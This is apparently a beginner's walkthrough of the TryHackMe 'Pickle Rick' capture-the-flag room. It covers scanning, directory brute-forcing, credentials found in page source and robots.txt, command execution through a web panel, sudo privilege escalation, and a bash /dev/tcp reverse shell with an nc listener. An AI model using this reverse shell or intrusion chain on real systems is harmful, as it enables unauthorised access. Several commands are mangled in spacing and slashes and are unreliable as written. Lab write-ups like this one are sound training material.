# Pickle-Rick-Writeup-
A writeup for Pickle Rick CTF room in Tryhackme https://tryhackme.com/room/picklerick. This is my first ever writeup, critics and suggestions are very welcome

# Scanning the target

For the first step in this excercise let's scan the machine to find
ports that is open using nmap. The options that i used for nmap are:

```
nmap -A -sV -oA nmap_result 10.10.205.
```
Breakdown of each of this options:
-A : extensive scan on the machine
-sV : enable version detection of each of the ports
-oA : enable the output to be saved locally with the name "nmap_result"


Based on the output of nmap, now we know that there are two ports
that we can access, port 22 and port 80, that is ssh and webserver
respectively. Okay now that we have the ports, what should we do?.
Well since we didn't have any credentials to access the ssh, let's
start with the webserver first.

# First Ingridient

## The webserver


Not alot to see or do in this page, but we can try to see its source
code if there's anything we can find

It looks like we found a username commented in the HTML code. If
there's a username then that means there's login page somewhere
in this server. Lets try to brute force the directory to find the login
page and other pages hidden in this server


## Finding directory using Dirsearch

For this excercise i use a tool called “dirsearch” in order to find
these directories. If you are more comfortable with other tools such
as. Gobuster, dirbuster and the likes, i'd say go for it.

The options that i used for dirsearch is:

```
dirsearch -u 10.10.9.36 -e php,html,js
```
A breakdown of this command is:
-u : is the url of the target
-e : will search for the desired extensions

It looks like there is a login page and a few other pages within this
server. Let's first take a look at the robots.txt page to see if there's
any other page hidden within the server that we might miss.


Nope, it looks like one of rick's personal catchphrase that he always
said in the series. But it might mean something, so lets hold on to it.
Next let's try the assets page to find any other hidden file or
information that we can use later on.

Nothing of the sorts, all of the files is just an image file and a couple
of css to use for the page. Clicking the parent directory leads us
back to the main page.

## Logging in to Rick's dashboard

After a bit of tour, let's access the login page.


We know the username is “R1ckRul3s” based on what we found in
the main page's source code, lets try to input “Wubbalubbadubdub”
that we found in the robots.txt as the password.

correct, now we can look around Rick's dashboard to find the
required ingridients to turn him back. Before moving to other pages
to see what's up, let's input a command “ls -al” to see if there's any


peculiar file here.

and it looks like there is, and what appears to be one of the
ingridient that we need. By replacing the “portal.php” in the url with
the file name, and we get the first ingridient.

# Second Ingridient

## Knowing the current location of the system

Before we start searching for the second ingridient. First thing is to
know where is our current location in the system, since we already
know that the command panel executes linux command, we can
input 'pwd' to know the current directory.

When execute.


Now we know where we are in the system. Since we're in /var, lets
look at /home directory to see what's in it using “ls” command:

```
ls/ home /
```
There are two directory in home, one is for rick and the other is
ubuntu. let's first search rick directory to see if he's putting the
other ingridients there, the command is "ls -la" to list all the files
that may be hidden to us.

```
ls -al \home\rick
```

There it is, the file containing the second ingridient. Let's use “cat”
to look at the file.

```
cat "/home/rick/second ingredients"
```
nope, looks like the “cat” command is disabled here, how about if
we use ‘less’ to see?.

```
less "/home/rick/second ingredients"
```

There we go.

Disclaimer: i didn't think of using this command when first time
solving this room, instead I use reverse shell.

# Third Ingredient

## Accessing the root

Now that we have the first and the second ingredient, to get the last
we will have to exploit the flaw of this system since we can't access
the root directory with our current privilege. To exploit, first we need
to list all the command the current user are allowed to run, to do
this, execute this command:

```
sudo -l
```

Based on this output, it means that we are able to freely execute
any command with the highest privileged without the system
prompting us for password, this means we know the way to access
the root directory. Let's list all the files in root with ‘ls’ command:

```
sudols/ root
```
now that we know the name of the file, open it with:

```
sudoless/ root / 3rd.txt
```

Congratuations. Rick is back into human again.

# Alternate Method

## Open up reverse shell

Instead of executing the command inside the webserver, we can
open up a reverse shell by executing this command in the panel:

```
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
```
Changing the RHOST with our own ip address and the RPORT with
whatever port we desire in our local computer. This will make the
server send a connection to us, what we'll do next is setting up our
computer to get that connection by executing this command in our
local console:

```
sudo nc -lvnp $RPORT
```
Change the RPORT with the same port number that we set for the
server. Breakdown of this command:


- sudo: nc needs to open up a port in the computer, for that it needs
the privilege of the user.
- lvnp: is a combination of option -l to listen for incoming connection,
-n to not perform domain name resolution, -v for verbose output,
and lastly -p to tell what port should nc listen to.

After executing the command, our console will look like this.

We can input whatever command that we execute in the server, and
we can use “cat” command this way, however. The connection at
the current state is considered fragile and will disconnect if we press
ctrl+c. There is a way to stabilize the connection using method from
others, but in my case. I can't seem to do it due to nc always hangs
on me afterwards, it probably an error on my part.



